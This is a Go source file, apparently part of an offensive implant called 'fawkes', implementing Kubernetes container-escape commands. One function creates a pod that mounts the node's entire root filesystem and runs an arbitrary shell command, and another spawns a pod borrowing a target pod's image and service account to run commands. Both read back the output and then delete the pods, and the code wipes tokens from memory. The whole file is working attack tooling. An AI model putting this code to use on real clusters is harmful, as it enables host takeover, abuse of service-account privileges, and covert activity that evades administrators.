//go:build linux

package commands

import (
	"encoding/json"
	"fmt"
	"strings"
	"time"

	"fawkes/pkg/structs"
)

// escapeK8sDeploy creates a pod with a specified image and command.
func escapeK8sDeploy(args containerEscapeArgs) (string, string) {
	kc, err := newK8sClient()
	if err != nil {
		return fmt.Sprintf("K8s deploy failed: %v", err), "error"
	}
	defer structs.ZeroString(&kc.token)

	ns := kc.namespace
	if args.Path != "" {
		ns = args.Path
	}

	image := args.Image
	if image == "" {
		image = "alpine"
	}

	command := args.Command
	if command == "" {
		return "Required: -command '<command to run in pod>'", "error"
	}

	podName := fmt.Sprintf("fawkes-%d", time.Now().Unix()%100000)

	podSpec := map[string]interface{}{
		"apiVersion": "v1",
		"kind":       "Pod",
		"metadata": map[string]interface{}{
			"name":      podName,
			"namespace": ns,
		},
		"spec": map[string]interface{}{
			"restartPolicy": "Never",
			"containers": []map[string]interface{}{
				{
					"name":    "exec",
					"image":   image,
					"command": []string{"/bin/sh", "-c", command},
					"volumeMounts": []map[string]interface{}{
						{
							"name":      "hostfs",
							"mountPath": "/hostfs",
						},
					},
				},
			},
			"volumes": []map[string]interface{}{
				{
					"name": "hostfs",
					"hostPath": map[string]interface{}{
						"path": "/",
						"type": "Directory",
					},
				},
			},
		},
	}

	podJSON, _ := json.Marshal(podSpec)

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[*] Creating pod '%s' in namespace '%s'\n", podName, ns))
	sb.WriteString(fmt.Sprintf("[*] Image: %s\n", image))
	sb.WriteString(fmt.Sprintf("[*] Command: %s\n\n", command))

	data, code, err := kc.k8sPost(fmt.Sprintf("/api/v1/namespaces/%s/pods", ns), podJSON)
	if err != nil {
		return fmt.Sprintf("Failed to create pod: %v", err), "error"
	}
	structs.ZeroBytes(data)

	if code < 200 || code >= 300 {
		return fmt.Sprintf("Pod creation failed (HTTP %d): %s", code, string(data)), "error"
	}
	sb.WriteString("[+] Pod created\n")

	for i := 0; i < 30; i++ {
		time.Sleep(2 * time.Second)
		statusData, statusCode, _ := kc.k8sGet(fmt.Sprintf("/api/v1/namespaces/%s/pods/%s", ns, podName))
		if statusCode != 200 {
			structs.ZeroBytes(statusData)
			continue
		}
		var podStatus struct {
			Status struct {
				Phase string `json:"phase"`
			} `json:"status"`
		}
		json.Unmarshal(statusData, &podStatus)
		structs.ZeroBytes(statusData)

		if podStatus.Status.Phase == "Succeeded" || podStatus.Status.Phase == "Failed" {
			sb.WriteString(fmt.Sprintf("[*] Pod phase: %s\n", podStatus.Status.Phase))
			break
		}
		if i == 29 {
			sb.WriteString(fmt.Sprintf("[!] Pod still in phase: %s (timeout)\n", podStatus.Status.Phase))
		}
	}

	logData, logCode, logErr := kc.k8sGet(fmt.Sprintf("/api/v1/namespaces/%s/pods/%s/log?container=exec", ns, podName))
	if logErr == nil && logCode == 200 {
		sb.WriteString("\n--- Output ---\n")
		sb.WriteString(string(logData))
		structs.ZeroBytes(logData)
	} else {
		sb.WriteString("[!] Failed to retrieve pod logs\n")
	}

	kc.k8sDelete(fmt.Sprintf("/api/v1/namespaces/%s/pods/%s", ns, podName))
	sb.WriteString("\n[+] Pod deleted\n")

	return sb.String(), "success"
}

// escapeK8sExec runs a command in an existing pod via ephemeral pod approach.
func escapeK8sExec(args containerEscapeArgs) (string, string) {
	if args.Command == "" {
		return "Required: -command '<pod-name> <command>'\nExample: -command 'nginx-pod-abc123 id'", "error"
	}

	parts := strings.SplitN(args.Command, " ", 2)
	if len(parts) < 2 {
		return "Format: -command '<pod-name> <command-to-run>'", "error"
	}
	targetPod := parts[0]
	execCmd := parts[1]

	kc, err := newK8sClient()
	if err != nil {
		return fmt.Sprintf("K8s exec failed: %v", err), "error"
	}
	defer structs.ZeroString(&kc.token)

	ns := kc.namespace
	if args.Path != "" {
		ns = args.Path
	}

	podData, podCode, podErr := kc.k8sGet(fmt.Sprintf("/api/v1/namespaces/%s/pods/%s", ns, targetPod))
	if podErr != nil || podCode != 200 {
		return fmt.Sprintf("Failed to get pod '%s' (HTTP %d): %v", targetPod, podCode, podErr), "error"
	}

	var targetSpec struct {
		Spec struct {
			Containers []struct {
				Image string `json:"image"`
			} `json:"containers"`
			ServiceAccountName string `json:"serviceAccountName"`
		} `json:"spec"`
	}
	json.Unmarshal(podData, &targetSpec)
	structs.ZeroBytes(podData)

	image := "alpine"
	if len(targetSpec.Spec.Containers) > 0 && targetSpec.Spec.Containers[0].Image != "" {
		image = targetSpec.Spec.Containers[0].Image
	}
	if args.Image != "" {
		image = args.Image
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[*] Target pod: %s (namespace: %s)\n", targetPod, ns))
	sb.WriteString(fmt.Sprintf("[*] Using image: %s\n", image))
	sb.WriteString(fmt.Sprintf("[*] Command: %s\n\n", execCmd))

	podName := fmt.Sprintf("fawkes-exec-%d", time.Now().Unix()%100000)
	podSpec := map[string]interface{}{
		"apiVersion": "v1",
		"kind":       "Pod",
		"metadata": map[string]interface{}{
			"name":      podName,
			"namespace": ns,
		},
		"spec": map[string]interface{}{
			"restartPolicy":      "Never",
			"serviceAccountName": targetSpec.Spec.ServiceAccountName,
			"containers": []map[string]interface{}{
				{
					"name":    "exec",
					"image":   image,
					"command": []string{"/bin/sh", "-c", execCmd},
				},
			},
		},
	}

	podJSON, _ := json.Marshal(podSpec)
	data, code, postErr := kc.k8sPost(fmt.Sprintf("/api/v1/namespaces/%s/pods", ns), podJSON)
	if postErr != nil || code < 200 || code >= 300 {
		return fmt.Sprintf("Failed to create exec pod (HTTP %d): %v\n%s", code, postErr, string(data)), "error"
	}
	structs.ZeroBytes(data)
	sb.WriteString(fmt.Sprintf("[+] Exec pod '%s' created\n", podName))

	for i := 0; i < 30; i++ {
		time.Sleep(2 * time.Second)
		statusData, _, _ := kc.k8sGet(fmt.Sprintf("/api/v1/namespaces/%s/pods/%s", ns, podName))
		var podStatus struct {
			Status struct {
				Phase string `json:"phase"`
			} `json:"status"`
		}
		json.Unmarshal(statusData, &podStatus)
		structs.ZeroBytes(statusData)
		if podStatus.Status.Phase == "Succeeded" || podStatus.Status.Phase == "Failed" {
			sb.WriteString(fmt.Sprintf("[*] Pod phase: %s\n", podStatus.Status.Phase))
			break
		}
	}

	logData, logCode, _ := kc.k8sGet(fmt.Sprintf("/api/v1/namespaces/%s/pods/%s/log?container=exec", ns, podName))
	if logCode == 200 {
		sb.WriteString("\n--- Output ---\n")
		sb.WriteString(string(logData))
		structs.ZeroBytes(logData)
	}

	kc.k8sDelete(fmt.Sprintf("/api/v1/namespaces/%s/pods/%s", ns, podName))
	sb.WriteString("\n[+] Exec pod deleted\n")

	return sb.String(), "success"
}
